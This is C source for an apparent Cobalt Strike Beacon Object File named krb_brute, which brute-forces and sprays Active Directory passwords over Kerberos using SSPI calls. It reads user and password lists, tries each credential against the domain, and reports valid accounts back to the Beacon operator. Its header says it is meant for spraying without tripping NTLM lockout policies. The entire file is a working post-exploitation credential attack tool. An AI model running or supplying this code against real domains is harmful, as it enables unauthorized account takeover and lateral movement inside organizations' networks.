/*
 * krb_brute - Kerberos password brute-force/spray
 *
 * Performs Kerberos-based password attacks by sending AS-REQ messages.
 * Useful for password spraying without triggering NTLM lockout policies.
 *
 * Usage: krb_brute /users:FILE /password:PASS [/domain:DOMAIN] [/dc:DC]
 *        krb_brute /user:USER /passwords:FILE [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>

#define MAX_LINES 1000
#define MAX_LINE_LEN 256

static int read_lines_from_file(const char* filepath, char lines[][MAX_LINE_LEN], int maxLines) {
    HANDLE hFile = KERNEL32$CreateFileA(
        filepath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }

    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        KERNEL32$CloseHandle(hFile);
        return -1;
    }

    char* buffer = (char*)malloc(fileSize + 1);
    if (!buffer) {
        KERNEL32$CloseHandle(hFile);
        return -1;
    }

    DWORD bytesRead = 0;
    if (!KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        free(buffer);
        KERNEL32$CloseHandle(hFile);
        return -1;
    }
    buffer[bytesRead] = '\0';
    KERNEL32$CloseHandle(hFile);

    int lineCount = 0;
    char* line = buffer;
    char* end = buffer + bytesRead;

    while (line < end && lineCount < maxLines) {
        char* newline = strchr(line, '\n');
        if (!newline) newline = end;

        int len = (int)(newline - line);
        if (len > 0 && line[len-1] == '\r') len--;

        if (len > 0 && len < MAX_LINE_LEN) {
            strncpy(lines[lineCount], line, len);
            lines[lineCount][len] = '\0';
            lineCount++;
        }

        line = newline + 1;
    }

    free(buffer);
    return lineCount;
}

static int try_auth(const char* domain, const char* username, const char* password,
                    const char* dc, formatp* output) {
    SECURITY_STATUS secStatus;
    CredHandle hCred;
    CtxtHandle hCtx;
    SecBufferDesc outBuffDesc;
    SecBuffer outBuff;
    TimeStamp expiry;
    ULONG contextAttr;

    /* Build identity structure */
    SEC_WINNT_AUTH_IDENTITY_A authIdentity;
    memset(&authIdentity, 0, sizeof(authIdentity));

    authIdentity.User = (unsigned char*)username;
    authIdentity.UserLength = (unsigned long)strlen(username);
    authIdentity.Domain = (unsigned char*)domain;
    authIdentity.DomainLength = (unsigned long)strlen(domain);
    authIdentity.Password = (unsigned char*)password;
    authIdentity.PasswordLength = (unsigned long)strlen(password);
    authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

    /* Acquire credentials */
    secStatus = SECUR32$AcquireCredentialsHandleA(
        NULL,
        "Kerberos",
        SECPKG_CRED_OUTBOUND,
        NULL,
        &authIdentity,
        NULL,
        NULL,
        &hCred,
        &expiry
    );

    if (secStatus != SEC_E_OK) {
        /* Credential acquisition failed - likely bad password or account issue */
        if (secStatus == SEC_E_LOGON_DENIED || secStatus == 0x8009030C) {
            return 0;  
        }
        return -1;  
    }

    /* Build target SPN */
    char targetSPN[512];
    if (dc) {
        sprintf(targetSPN, "krbtgt/%s", domain);
    } else {
        sprintf(targetSPN, "krbtgt/%s", domain);
    }

    /* Setup output buffer */
    outBuff.cbBuffer = 4096;
    outBuff.BufferType = SECBUFFER_TOKEN;
    outBuff.pvBuffer = malloc(4096);

    outBuffDesc.ulVersion = SECBUFFER_VERSION;
    outBuffDesc.cBuffers = 1;
    outBuffDesc.pBuffers = &outBuff;

    secStatus = SECUR32$InitializeSecurityContextA(
        &hCred,
        NULL,
        targetSPN,
        ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
        0,
        SECURITY_NATIVE_DREP,
        NULL,
        0,
        &hCtx,
        &outBuffDesc,
        &contextAttr,
        &expiry
    );

    free(outBuff.pvBuffer);
    SECUR32$FreeCredentialsHandle(&hCred);

    if (secStatus == SEC_E_OK || secStatus == SEC_I_CONTINUE_NEEDED) {
        SECUR32$DeleteSecurityContext(&hCtx);
        return 1;  
    }

    return 0;  
}

void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    WSADATA wsaData;

    BeaconFormatAlloc(&output, 64 * 1024);
    arg_init(&parser, args, alen);

    char* user = arg_get(&parser, "user");
    char* users_file = arg_get(&parser, "users");
    char* password = arg_get(&parser, "password");
    char* passwords_file = arg_get(&parser, "passwords");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");
    char* delay_str = arg_get(&parser, "delay");

    int delay = delay_str ? atoi(delay_str) : 0;

    if (!user && !users_file) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_brute /users:FILE /password:PASS [/domain:DOMAIN] [/dc:DC]");
        BeaconPrintf(CALLBACK_ERROR, "       krb_brute /user:USER /passwords:FILE [/domain:DOMAIN] [/dc:DC]");
        goto cleanup;
    }

    if (!password && !passwords_file) {
        BeaconPrintf(CALLBACK_ERROR, "Must specify /password:PASS or /passwords:FILE");
        goto cleanup;
    }


    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconPrintf(CALLBACK_ERROR, "Could not determine domain. Please specify /domain:");
            goto cleanup;
        }
    }

    BeaconFormatPrintf(&output, "[*] Action: Kerberos Brute Force\n\n");
    BeaconFormatPrintf(&output, "[*] Domain    : %s\n", domain);
    if (dc) BeaconFormatPrintf(&output, "[*] DC        : %s\n", dc);
    if (delay > 0) BeaconFormatPrintf(&output, "[*] Delay     : %d ms\n", delay);
    BeaconFormatPrintf(&output, "\n");

    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);

    int successCount = 0;
    int failCount = 0;
    int errorCount = 0;

    /* Mode 1: Single user, multiple passwords */
    if (user && passwords_file) {
        static char passwords[MAX_LINES][MAX_LINE_LEN];
        int passCount = read_lines_from_file(passwords_file, passwords, MAX_LINES);

        if (passCount < 0) {
            BeaconFormatPrintf(&output, "[-] Failed to read passwords file: %s\n", passwords_file);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[*] Loaded %d passwords from file\n", passCount);
        BeaconFormatPrintf(&output, "[*] Target user: %s\\%s\n\n", domain, user);

        for (int i = 0; i < passCount; i++) {
            int result = try_auth(domain, user, passwords[i], dc, &output);

            if (result == 1) {
                BeaconFormatPrintf(&output, "[+] VALID: %s\\%s : %s\n", domain, user, passwords[i]);
                successCount++;
                break;  /* Found valid password, stop trying */
            } else if (result == 0) {
                failCount++;
            } else {
                errorCount++;
            }

            if (delay > 0) {
                KERNEL32$Sleep(delay);
            }
        }
    }

    /* Mode 2: Multiple users, single password (spray) */
    else if (users_file && password) {
        static char users[MAX_LINES][MAX_LINE_LEN];
        int userCount = read_lines_from_file(users_file, users, MAX_LINES);

        if (userCount < 0) {
            BeaconFormatPrintf(&output, "[-] Failed to read users file: %s\n", users_file);
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[*] Loaded %d users from file\n", userCount);
        BeaconFormatPrintf(&output, "[*] Password to spray: %s\n\n", password);

        for (int i = 0; i < userCount; i++) {
            int result = try_auth(domain, users[i], password, dc, &output);

            if (result == 1) {
                BeaconFormatPrintf(&output, "[+] VALID: %s\\%s : %s\n", domain, users[i], password);
                successCount++;
            } else if (result == 0) {
                failCount++;
            } else {
                errorCount++;
            }

            if (delay > 0) {
                KERNEL32$Sleep(delay);
            }
        }
    }

    /* Mode 3: Single user, single password */
    else if (user && password) {
        BeaconFormatPrintf(&output, "[*] Testing: %s\\%s : %s\n\n", domain, user, password);

        int result = try_auth(domain, user, password, dc, &output);

        if (result == 1) {
            BeaconFormatPrintf(&output, "[+] VALID: %s\\%s : %s\n", domain, user, password);
            successCount++;
        } else if (result == 0) {
            BeaconFormatPrintf(&output, "[-] INVALID: %s\\%s : %s\n", domain, user, password);
            failCount++;
        } else {
            BeaconFormatPrintf(&output, "[!] ERROR testing %s\\%s\n", domain, user);
            errorCount++;
        }
    }

    BeaconFormatPrintf(&output, "\n[*] Results:\n");
    BeaconFormatPrintf(&output, "    Valid   : %d\n", successCount);
    BeaconFormatPrintf(&output, "    Invalid : %d\n", failCount);
    BeaconFormatPrintf(&output, "    Errors  : %d\n", errorCount);

    WS2_32$WSACleanup();
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (user) free(user);
    if (users_file) free(users_file);
    if (password) free(password);
    if (passwords_file) free(passwords_file);
    if (domain) free(domain);
    if (dc) free(dc);
    if (delay_str) free(delay_str);
}
